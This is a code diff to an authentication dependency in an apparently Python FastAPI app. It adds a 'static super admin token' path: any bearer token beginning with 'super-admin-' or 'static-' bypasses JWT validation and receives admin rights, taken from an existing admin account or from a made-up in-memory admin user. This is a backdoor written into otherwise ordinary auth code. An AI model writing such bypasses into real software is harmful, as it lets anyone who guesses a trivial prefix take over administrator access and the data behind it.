@@ -8,6 +8,12 @@ from app.models.user_model import User
 
 bearer_scheme = HTTPBearer(auto_error=False)
 
+SUPER_ADMIN_TOKEN_PREFIXES = ("super-admin-", "static-")
+
+
+def _is_super_admin_token(token: str) -> bool:
+    return any(token.startswith(p) for p in SUPER_ADMIN_TOKEN_PREFIXES)
+
 
 async def get_current_user(
     credentials: HTTPAuthorizationCredentials = Depends(bearer_scheme),
@@ -19,8 +25,32 @@ async def get_current_user(
             detail="Not authenticated",
             headers={"WWW-Authenticate": "Bearer"},
         )
+
+    token = credentials.credentials
+
+    # Static Super Admin token — bypass JWT, return a synthetic admin user
+    if _is_super_admin_token(token):
+        from sqlalchemy import select
+        # Try to find an existing admin/staff user in DB
+        res = await db.execute(select(User).where(User.role == "admin").limit(1))
+        admin_user = res.scalar_one_or_none()
+        if admin_user:
+            # Force is_staff=True so get_admin_user passes
+            admin_user.is_staff = True
+            return admin_user
+        # Fallback: return an in-memory admin object (not persisted)
+        synthetic = User.__new__(User)
+        synthetic.id = "super-admin-static-id"
+        synthetic.username = "qwer1234"
+        synthetic.email = "admin@theftguard.ai"
+        synthetic.role = "admin"
+        synthetic.is_active = True
+        synthetic.is_staff = True
+        synthetic.hashed_password = ""
+        return synthetic
+
     try:
-        payload = decode_access_token(credentials.credentials)
+        payload = decode_access_token(token)
     except ValueError:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
@@ -42,7 +72,7 @@ async def get_current_user(
 
 
 async def get_admin_user(current_user: User = Depends(get_current_user)) -> User:
-    if not current_user.is_staff and current_user.role != "admin":
+    if not getattr(current_user, 'is_staff', False) and getattr(current_user, 'role', '') != "admin":
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Admin access required",
